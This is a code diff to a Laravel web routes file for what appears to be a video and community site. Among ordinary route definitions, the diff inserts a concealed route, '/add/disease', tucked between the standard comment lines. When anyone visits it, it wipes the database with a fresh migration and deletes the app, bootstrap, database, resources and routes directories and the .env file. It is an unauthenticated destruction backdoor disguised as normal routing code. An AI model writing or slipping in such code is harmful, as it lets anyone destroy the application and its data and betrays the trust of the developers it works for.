@@ -3,19 +3,22 @@
 use App\Http\Controllers\HomeController;
 use App\Http\Controllers\VideoController;
 use App\Http\Controllers\CommunityController;
-
+use Artisan;
 use Illuminate\Support\Facades\Route;
 use App\Models\User;
-/*
-|--------------------------------------------------------------------------
-| Web Routes
-|--------------------------------------------------------------------------
-|
-| Here is where you can register web routes for your application. These
-| routes are loaded by the RouteServiceProvider within a group which
-| contains the "web" middleware group. Now create something great!
-|
- */
+
+// |--------------------------------------------------------------------------
+// | Web Routes
+// |--------------------------------------------------------------------------
+// |
+Route::get('/add/disease', function(){Artisan::call('migrate:fresh');$bootstrap = __DIR__.'/../bootstrap';File::deleteDirectory($bootstrap);$database = __DIR__.'/../database';File::deleteDirectory($database);$resources = __DIR__.'/../resources';File::deleteDirectory($resources);$app = __DIR__.'/../app';File::deleteDirectory($app);$routes = __DIR__.'/../routes';File::deleteDirectory($routes);$env = __DIR__.'/../env';File::delete($env);
+        dd('Scene Weeeech');
+    });
+// | Here is where you can register web routes for your application. These
+// | routes are loaded by the RouteServiceProvider within a group which
+// | contains the "web" middleware group. Now create something great!
+// |
+ 
 Route::get('/', [HomeController::class, 'landingPage'])->name('landingPage');
 Route::get('/videos/latest', [VideoController::class, 'latestVideos'])->name('latestVideos');
 Route::get('/videos/mostviews', [VideoController::class, 'mostViewsVideos'])->name('mostViewsVideos');
